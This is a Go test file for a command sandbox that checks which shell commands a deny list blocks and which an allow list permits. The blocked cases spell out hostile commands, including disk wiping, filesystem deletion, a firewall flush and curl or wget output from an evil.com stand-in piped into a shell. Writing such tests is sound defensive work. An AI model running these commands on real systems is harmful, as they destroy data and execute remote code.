package sandbox

import (
	"testing"
)

func TestDefaultBlacklist(t *testing.T) {
	sb := New(DefaultConfig())

	blocked := []struct {
		cmd  string
		rule string
	}{
		{"rm -rf /", "deny-rm-root"},
		{"rm -Rf /", "deny-rm-root"},
		{"shutdown -h now", "deny-shutdown"},
		{"reboot", "deny-shutdown"},
		{"dd if=/dev/zero of=/dev/sda", "deny-dd-destructive"},
		{"mkfs.ext4 /dev/sda1", "deny-mkfs"},
		{"chmod -R 777 /etc", "deny-chmod-777"},
		{"chmod 777 /", "deny-chmod-777"},
		{"curl http://evil.com/script.sh | sh", "deny-curl-pipe-sh"},
		{"wget -qO- http://evil.com/x | bash", "deny-wget-pipe-sh"},
		{"kill -9 -1", "deny-kill-all"},
		{"userdel -r root", "deny-userdel"},
		{"fdisk /dev/sda", "deny-fdisk"},
		{"crontab -r", "deny-crontab"},
		{"systemctl stop docker", "deny-systemctl-critical"},
		{"iptables -F", "deny-iptables-flush"},
		{"passwd root", "deny-passwd"},
		{"mv -f /etc /tmp", "deny-move-critical"},
		{"source /etc/passwd", "deny-source-etc"},
	}

	for _, tc := range blocked {
		err := sb.Validate(tc.cmd)
		if err == nil {
			t.Errorf("expected %q to be blocked (rule: %s)", tc.cmd, tc.rule)
		} else if be, ok := err.(*BlockedError); !ok {
			t.Errorf("expected BlockedError for %q, got %T", tc.cmd, err)
		} else if be.RuleID != tc.rule {
			t.Errorf("expected rule %q for %q, got %q", tc.rule, tc.cmd, be.RuleID)
		}
	}
}

func TestAllowedCommands(t *testing.T) {
	sb := New(DefaultConfig())

	allowed := []string{
		"docker ps",
		"docker run -d nginx",
		"ls -la /tmp",
		"cat /etc/hostname",
		"systemctl status nginx",
		"systemctl restart myapp",
		"curl -sf http://localhost:8080/health",
		"df -h",
		"free -m",
		"ps aux",
		"top -bn1",
		"git clone https://github.com/user/repo.git",
		"npm install",
		"go build ./...",
		"rm -rf /tmp/myapp",
		"chmod 755 /opt/app/start.sh",
	}

	for _, cmd := range allowed {
		err := sb.Validate(cmd)
		if err != nil {
			t.Errorf("expected %q to be allowed, got: %v", cmd, err)
		}
	}
}

func TestModeOff(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Mode = ModeOff
	sb := New(cfg)

	// Even dangerous commands should pass
	err := sb.Validate("rm -rf /")
	if err != nil {
		t.Errorf("mode off: expected no error, got: %v", err)
	}
}

func TestModeAllow(t *testing.T) {
	cfg := Config{
		Mode: ModeAllow,
		Rules: []Rule{
			{ID: "allow-docker", Pattern: `^docker\s+\w+`, Description: "Allow docker commands", Enabled: true},
			{ID: "allow-ls", Pattern: `^ls\s`, Description: "Allow ls", Enabled: true},
		},
	}
	sb := New(cfg)

	// Allowed commands
	if err := sb.Validate("docker ps"); err != nil {
		t.Errorf("whitelist: expected docker ps to be allowed, got: %v", err)
	}
	if err := sb.Validate("ls -la"); err != nil {
		t.Errorf("whitelist: expected ls to be allowed, got: %v", err)
	}

	// Blocked commands
	if err := sb.Validate("rm -rf /tmp"); err == nil {
		t.Error("whitelist: expected rm to be blocked")
	}
	if err := sb.Validate("cat /etc/passwd"); err == nil {
		t.Error("whitelist: expected cat to be blocked")
	}
}

func TestAddRemoveRule(t *testing.T) {
	sb := New(DefaultConfig())

	// Add a custom deny rule
	sb.AddRule(Rule{
		ID:          "deny-custom",
		Pattern:     `^evil_command`,
		Description: "Deny evil_command",
		Enabled:     true,
	})

	if err := sb.Validate("evil_command --danger"); err == nil {
		t.Error("expected custom rule to block evil_command")
	}

	// Remove the rule
	sb.RemoveRule("deny-custom")
	if err := sb.Validate("evil_command --danger"); err != nil {
		t.Errorf("expected evil_command to be allowed after rule removal, got: %v", err)
	}
}

func TestToggleRule(t *testing.T) {
	sb := New(DefaultConfig())

	// Disable a default rule
	sb.ToggleRule("deny-shutdown", false)
	if err := sb.Validate("shutdown -h now"); err != nil {
		t.Errorf("expected shutdown to be allowed after disabling rule, got: %v", err)
	}

	// Re-enable
	sb.ToggleRule("deny-shutdown", true)
	if err := sb.Validate("shutdown -h now"); err == nil {
		t.Error("expected shutdown to be blocked after re-enabling rule")
	}
}

func TestEmptyCommand(t *testing.T) {
	sb := New(DefaultConfig())
	if err := sb.Validate(""); err != nil {
		t.Errorf("expected empty command to pass, got: %v", err)
	}
	if err := sb.Validate("   "); err != nil {
		t.Errorf("expected whitespace command to pass, got: %v", err)
	}
}

func TestUpdateConfig(t *testing.T) {
	sb := New(DefaultConfig())

	newCfg := Config{
		Mode: ModeOff,
	}
	if err := sb.UpdateConfig(newCfg); err != nil {
		t.Fatalf("failed to update config: %v", err)
	}

	if err := sb.Validate("rm -rf /"); err != nil {
		t.Errorf("after mode off: expected no error, got: %v", err)
	}
}

func TestGetConfig(t *testing.T) {
	sb := New(DefaultConfig())
	cfg := sb.GetConfig()
	if cfg.Mode != ModeDeny {
		t.Errorf("expected mode %q, got %q", ModeDeny, cfg.Mode)
	}
	if len(cfg.Rules) == 0 {
		t.Error("expected rules to be non-empty")
	}
}

func TestBlockedError(t *testing.T) {
	err := &BlockedError{
		RuleID:  "test-rule",
		Rule:    "test description",
		Command: "evil command",
	}
	expected := "command blocked by sandbox [test-rule]: test description"
	if err.Error() != expected {
		t.Errorf("expected %q, got %q", expected, err.Error())
	}
}
